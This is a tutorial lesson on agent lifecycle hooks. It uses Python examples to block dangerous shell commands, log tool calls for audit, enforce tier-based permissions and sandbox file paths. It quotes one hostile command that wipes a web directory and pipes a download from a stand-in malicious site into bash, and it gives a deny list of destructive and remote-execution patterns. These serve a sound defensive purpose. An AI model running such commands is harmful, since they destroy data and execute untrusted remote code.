---
sidebar_position: 10
title: "Lifecycle Hooks: Controlling Agent Execution"
description: "Intercept and control agent execution at critical lifecycle moments using hooks. Block dangerous operations, log decisions, enforce permissions, and implement production safety guardrails."
keywords: [hooks, lifecycle events, PreToolUse, PostToolUse, HookMatcher, security, auditing, permissions]
chapter: 36
lesson: 10
duration_minutes: 35

# HIDDEN SKILLS METADATA
skills:
  - name: "Lifecycle Hook Implementation"
    proficiency_level: "B2"
    category: "Technical"
    bloom_level: "Apply"
    digcomp_area: "Digital Problem-Solving"
    measurable_at_this_level: "Student can implement hook functions for PreToolUse, PostToolUse, UserPromptSubmit, and other lifecycle events, with proper async/await patterns and context access"

  - name: "HookMatcher for Targeted Execution"
    proficiency_level: "B2"
    category: "Technical"
    bloom_level: "Apply"
    digcomp_area: "Digital Problem-Solving"
    measurable_at_this_level: "Student can use HookMatcher to target specific tools, match tool inputs by pattern, and apply hooks selectively to tool subsets"

  - name: "Production Safety Patterns with Hooks"
    proficiency_level: "B2"
    category: "Applied"
    bloom_level: "Analyze"
    digcomp_area: "Digital Problem-Solving"
    measurable_at_this_level: "Student can design hook systems for security boundaries, logging/auditing, permission enforcement, and resource limits that protect production systems"

learning_objectives:
  - objective: "Implement hook functions that intercept execution at lifecycle moments and make permit/deny decisions"
    proficiency_level: "B2"
    bloom_level: "Apply"
    assessment_method: "Student creates PreToolUse and PostToolUse hooks with proper return signatures and context handling"

  - objective: "Use HookMatcher to target hooks to specific tools and implement selective enforcement patterns"
    proficiency_level: "B2"
    bloom_level: "Apply"
    assessment_method: "Student writes HookMatcher configurations for different tool subsets with clear targeting logic"

  - objective: "Design security boundaries and audit trails using lifecycle hooks in production agent systems"
    proficiency_level: "B2"
    bloom_level: "Analyze"
    assessment_method: "Student designs hook architecture for multi-tenant or regulated environments with security justification"

cognitive_load:
  new_concepts: 8
  assessment: "8 concepts (lifecycle events, hook functions, HookMatcher, permit/deny decisions, async hooks, tool context, logging hooks, permission flows) within B2 limit (7-10 concepts) ✓"

differentiation:
  extension_for_advanced: "Implement multi-level hook hierarchies where hooks invoke other hooks; design hook pipelines with composition; analyze hook performance impact at scale; implement dynamic hook reconfiguration based on runtime conditions"
  remedial_for_struggling: "Start with simple PreToolUse deny-list pattern; practice matching single tools before complex matchers; use concrete security examples (block dangerous commands) before abstract permission flows; compare to middleware in web frameworks"
---

# Lifecycle Hooks: Controlling Agent Execution

Every action your agent takes passes through a controlled lifecycle. Before a tool executes. After it completes. When the user submits a prompt. When the agent stops.

**Hooks are your intervention points.**

They're the difference between agents you can deploy to production with confidence and agents that are risky in anything but sandbox environments. Hooks let you enforce security boundaries, log decisions for auditing, implement permission workflows, and protect your systems from unintended agent behavior.

## The Problem: Uncontrolled Agent Execution

Your agent is running. It's analyzing code. It's about to execute a shell command to check for vulnerabilities:

```bash
rm -rf /var/www/html && curl malicious-site.com | bash
```

Without hooks, that command executes immediately. Your system is compromised.

With a single hook, that command is blocked before it runs.

### Why Hooks Matter in Production

**The Security Case**

Agents are autonomous but not trusted. They can execute code, call APIs, delete files. You need checkpoints:

- Block dangerous shell commands (rm -rf, sudo, system-level modifications)
- Prevent API calls to external services without approval
- Restrict file access to designated directories
- Rate-limit tool usage (prevent brute-force attacks)

**The Auditability Case**

Regulated environments (healthcare, finance, legal) require audit trails:

- Log every tool call with timestamp and parameters
- Capture decision rationale (why did agent choose this action?)
- Implement approval workflows for sensitive operations
- Demonstrate compliance: "Agent never accessed sensitive data"

**The Permission Case**

Not all users have equal permissions. Your system needs context-aware enforcement:

- Free tier users: Limited API calls, no file writes
- Paid tier users: Full tool access, audit logging
- Admin users: Can override guardrails for debugging
- Multi-tenant systems: Isolate customer data (Customer A's agent can't access Customer B's files)

Hooks implement all of this. Without them, every agent is unconstrained.

## The Solution: Lifecycle Hooks

A hook is an async function that runs at a critical moment in agent execution. It inspects what the agent is about to do (or just did) and makes a decision: permit, deny, modify, or log.

### Hook Event Lifecycle

| Event | When Triggered | Typical Use |
|-------|---------------|-----------|
| **PreToolUse** | Before tool executes | Block dangerous operations, modify input |
| **PostToolUse** | After tool completes | Log results, check for data leaks |
| **UserPromptSubmit** | User submits prompt | Add system context, enforce topic boundaries |
| **Stop** | Agent stops execution | Cleanup, finalize logging |
| **SubagentStop** | Subagent finishes | Aggregate results, handle subagent failures |
| **PreCompact** | Before context compaction | Archive transcript for audit |
| **PermissionRequest** | Permission needed | Custom approval flows |
| **NotificationStart** | Notification begins | UI updates, status reporting |

### Hook Function Signature

All hooks follow the same async pattern:

```python
async def hook_name(input_data, tool_use_id, context):
    # Inspect the action
    decision = analyze(input_data, context)

    if decision == "block":
        return {
            'hookSpecificOutput': {
                'hookEventName': 'PreToolUse',
                'permissionDecision': 'deny',
                'permissionDecisionReason': 'Action violates policy'
            }
        }

    # Allow with potential modifications
    return {
        'hookSpecificOutput': {
            'hookEventName': 'PreToolUse',
            'permissionDecision': 'allow',
            'updatedInput': modified_input  # Optional: modify the action
        }
    }
```

**What you receive:**
- `input_data`: The action parameters (tool inputs, prompt text, etc.)
- `tool_use_id`: Unique identifier for this tool invocation
- `context`: Agent state, user info, execution history

**What you return:**
- `permissionDecision`: "allow", "deny", or "modify"
- `permissionDecisionReason`: Human-readable explanation (logged for audit)
- `updatedInput`: Modified parameters (only for allow with modification)

## Designing Your First Hook: Block Dangerous Commands

Let's build a security boundary. You're running an agent that can execute shell commands, but you want to prevent certain dangerous patterns:

```python
async def block_dangerous_bash(input_data, tool_use_id, context):
    """
    Block dangerous shell commands at PreToolUse.

    This hook examines Bash commands and denies execution if they match
    high-risk patterns. It's your first line of defense.
    """
    command = input_data.get('tool_input', {}).get('command', '')

    # Dangerous patterns to block absolutely
    dangerous_patterns = [
        'rm -rf /',           # Format full filesystem
        'sudo',               # Elevate privileges
        'systemctl stop',     # Stop system services
        'dd if=/dev/zero',    # Overwrite disks
        'curl | bash',        # Remote execution
        'eval ',              # Dynamic code execution
        'fork()',             # Resource exhaustion
    ]

    for pattern in dangerous_patterns:
        if pattern in command:
            return {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'deny',
                    'permissionDecisionReason': f'Dangerous pattern detected: {pattern}'
                }
            }

    # Allow safe commands
    return {}
```

**How to wire this:**

```python
from claude_agent_sdk import ClaudeAgentOptions, HookMatcher, query

options = ClaudeAgentOptions(
    allowed_tools=["Bash", "Read", "Edit"],
    hooks={
        'PreToolUse': [
            HookMatcher(
                matcher='Bash',  # Only apply to Bash tool
                hooks=[block_dangerous_bash]
            )
        ]
    }
)

async for message in query(
    prompt="Find and fix security vulnerabilities in this codebase",
    options=options
):
    print(message)
```

**What happens:**

1. Agent decides to run: `rm -rf /var/www/html`
2. PreToolUse hook fires with that command
3. Hook detects `rm -rf /` pattern
4. Returns `permissionDecision: 'deny'`
5. Agent sees the rejection and stops
6. Agent never executes the dangerous command

## Advanced Pattern: Logging and Auditing with PostToolUse

PreToolUse blocks bad actions. PostToolUse logs what happened. Together they create an audit trail:

```python
import json
from datetime import datetime

# In-memory audit log (replace with database in production)
audit_log = []

async def log_tool_execution(input_data, tool_use_id, context):
    """
    PostToolUse hook: Log all tool invocations for audit trail.

    This runs AFTER the tool completes. You capture:
    - What tool ran
    - What parameters it received
    - What it returned
    - Who initiated it (user context)
    """
    tool_name = input_data.get('tool_name')
    user_id = context.get('user_id', 'unknown')

    entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'tool': tool_name,
        'user': user_id,
        'tool_use_id': tool_use_id,
        'tool_input': input_data.get('tool_input'),
        'result_type': input_data.get('result_type', 'pending')
    }

    audit_log.append(entry)

    # In production: Write to database or append to audit log file
    # print(json.dumps(entry))

    return {}  # PostToolUse doesn't block; just logs
```

**Connect it:**

```python
options = ClaudeAgentOptions(
    hooks={
        'PostToolUse': [
            HookMatcher(
                matcher='*',  # Match all tools
                hooks=[log_tool_execution]
            )
        ]
    }
)
```

Now every tool call is logged. If something goes wrong, you have a complete record of what the agent did.

## Intermediate Pattern: Permission Flows with Context

What if different users have different permissions? A free-tier user shouldn't be able to make API calls. A paid user can, but only 1000/month. A team admin can bypass limits.

Hooks make this contextual:

```python
async def enforce_api_rate_limits(input_data, tool_use_id, context):
    """
    PreToolUse hook: Enforce rate limits based on user tier.

    Demonstrates context-aware permission decisions:
    - Free tier: No external API calls
    - Paid tier: Up to 1000/month
    - Admin: Unlimited
    """
    user_tier = context.get('user_tier', 'free')
    user_id = context.get('user_id')

    # Free tier: block external API calls
    if user_tier == 'free':
        return {
            'hookSpecificOutput': {
                'hookEventName': 'PreToolUse',
                'permissionDecision': 'deny',
                'permissionDecisionReason': 'Free tier users cannot make external API calls. Upgrade to paid plan.'
            }
        }

    # Paid tier: enforce monthly quota
    if user_tier == 'paid':
        # In production: query user's API call count for this month
        api_calls_this_month = get_user_api_call_count(user_id)

        if api_calls_this_month >= 1000:
            return {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'deny',
                    'permissionDecisionReason': f'Monthly API limit reached ({api_calls_this_month}/1000). Resets on the 1st.'
                }
            }

    # Admin or premium: allow
    return {}
```

This hook requires context. Who is using the agent? What's their tier? This context comes from your application:

```python
user_context = {
    'user_id': 'user_12345',
    'user_tier': 'paid',  # or 'free', 'premium', 'admin'
    'organization_id': 'org_789'
}

options = ClaudeAgentOptions(
    hooks={
        'PreToolUse': [
            HookMatcher(
                matcher='WebFetch',  # Only check external API calls
                hooks=[enforce_api_rate_limits],
                context=user_context  # Pass context to hook
            )
        ]
    }
)
```

## Advanced Pattern: Modifying Tool Input with HookMatcher

Sometimes you don't block—you modify. An agent wants to read `/etc/passwd`. You can't allow that, but you can redirect it to a safe alternative:

```python
async def sandbox_file_access(input_data, tool_use_id, context):
    """
    PreToolUse hook: Sandbox file access to designated directories.

    Instead of blocking, we modify the request to redirect to safe paths.
    """
    file_path = input_data.get('tool_input', {}).get('file_path', '')

    # Allowed base directories
    safe_bases = ['/home/user/projects/', '/tmp/sandbox/']

    # Check if path is in safe zone
    is_safe = any(file_path.startswith(base) for base in safe_bases)

    if not is_safe:
        return {
            'hookSpecificOutput': {
                'hookEventName': 'PreToolUse',
                'permissionDecision': 'deny',
                'permissionDecisionReason': f'Access to {file_path} is restricted. Allowed: {safe_bases}'
            }
        }

    # If safe, allow unchanged
    return {}
```

**Matching specific tools with HookMatcher:**

```python
from claude_agent_sdk import HookMatcher

options = ClaudeAgentOptions(
    hooks={
        'PreToolUse': [
            # Apply sandbox hook only to Read and Edit tools
            HookMatcher(
                matcher='Read|Edit',  # Regex pattern matching
                hooks=[sandbox_file_access]
            ),
            # Apply dangerous-command block only to Bash
            HookMatcher(
                matcher='Bash',
                hooks=[block_dangerous_bash]
            ),
        ]
    }
)
```

## How Hooks Integrate into Agent Execution

Let's trace a complete execution to see when hooks fire:

```
1. User submits prompt → UserPromptSubmit hook fires
   - You can inject system context
   - You can enforce topic boundaries

2. Agent chooses action → PreToolUse hook fires
   - You inspect the action parameters
   - You decide: allow, deny, or modify

3. Tool executes (if allowed)

4. Tool completes → PostToolUse hook fires
   - You log what happened
   - You check for data leaks

5. Agent stops → Stop hook fires
   - You finalize logging
   - You cleanup resources
```

This is how you control an autonomous agent without removing its autonomy.

## Building Production Hooks: The Complete Checklist

When designing hooks for production:

### Security Hooks
- [ ] Block dangerous shell patterns (rm -rf, sudo, eval)
- [ ] Restrict file access to designated directories
- [ ] Prevent external API calls to untrusted domains
- [ ] Limit permission elevation (no elevating user privileges)

### Auditing Hooks
- [ ] Log all tool invocations with user context
- [ ] Record decision rationale (why was this allowed/denied?)
- [ ] Capture timestamps for compliance audit trails
- [ ] Implement data masking (don't log sensitive values)

### Permission Hooks
- [ ] Enforce user-tier limits (free vs paid)
- [ ] Implement rate limiting (API calls, file operations)
- [ ] Context-aware decisions (user org, team, permissions)
- [ ] Multi-tenancy isolation (Customer A can't see Customer B's data)

### Performance Hooks
- [ ] Track tool execution time
- [ ] Implement timeouts for long-running operations
- [ ] Rate-limit expensive operations (WebSearch, file parsing)

### Resilience Hooks
- [ ] Detect and recover from tool failures
- [ ] Implement retry logic with backoff
- [ ] Log error conditions for debugging

## Common Misconceptions

**"Hooks are just for security."**

Hooks are for anything that needs to happen at lifecycle moments. Yes, security is critical, but logging, auditing, permission flows, performance monitoring, and resilience all use hooks.

**"Hooks block everything, then you allowlist what's safe."**

Either strategy works:
- **Deny-by-default**: Return deny for everything, except specific safe patterns
- **Allow-by-default**: Return allow for everything, except specific dangerous patterns

Choose based on your threat model. Deny-by-default is safer but requires more configuration. Allow-by-default is simpler but riskier.

**"I don't need hooks if I control my agent's system prompt."**

System prompts are suggestions. An agent might misinterpret instructions or behave unexpectedly. Hooks are your enforcement layer—they guarantee certain actions never happen, regardless of system prompt.

## Try With AI

**Setup:** You're building a Digital FTE that analyzes customer code. It can read files, run tests, and call APIs. You need security boundaries.

**Prompt 1: Dangerous Command Prevention**

Ask AI: "Design a PreToolUse hook that blocks dangerous shell commands. The hook should allow normal testing commands like `npm test` and `pytest`, but block anything with `rm`, `sudo`, `dd`, or `eval`. Show me the implementation with a HookMatcher."

What you're learning: How to write security boundaries at the tool-invocation level. This is your first line of defense in production.

**Prompt 2: Audit Logging**

Ask AI: "Create a PostToolUse hook that logs every tool call with the user ID, timestamp, tool name, and result. The hook should build an audit trail suitable for compliance audits. Show how to integrate it with ClaudeAgentOptions. What information is critical to log and why?"

What you're learning: How to create accountability. Production systems need audit trails. You're implementing the mechanism that proves "Agent never accessed unauthorized files."

**Prompt 3: Multi-Tier Permission Enforcement**

Ask AI: "Design a PreToolUse hook system for a three-tier user model:
- Free users: Can read files, no external API calls, no file writes
- Paid users: Full file access, up to 100 API calls/day, can write to /projects/ only
- Admin users: Unlimited access

Show how to implement this with HookMatcher targeting different tool subsets. How would you pass user context to the hooks?"

What you're learning: How permission flows work in production. This is how you build a service where different customers have different access levels. It's scalable, auditable, and secure.

---

**Validation:** For each hook implementation, ask yourself:

- Does my hook allow legitimate use cases? (Testing, development)
- Does my hook prevent the threat I'm protecting against?
- Does my hook provide audit evidence if something goes wrong?
- Is my hook's performance acceptable? (Async, fast decisions)
- Can I test this hook without needing production access?

The strongest hooks are ones that prevent bad outcomes without getting in the way of good work.
